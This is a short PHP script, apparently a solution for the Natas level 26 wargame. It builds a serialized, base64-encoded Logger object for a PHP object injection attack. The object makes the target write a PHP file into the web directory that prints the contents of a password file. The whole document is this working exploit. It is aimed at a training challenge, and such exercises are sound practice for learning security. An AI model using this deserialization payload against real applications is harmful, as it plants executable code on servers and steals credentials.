<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="NOT_IMP\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?>\n";
        $this->logFile = "img/natas26_shell.php";
    }
}

$o = new Logger();
print base64_encode(serialize($o))."\n";

?>
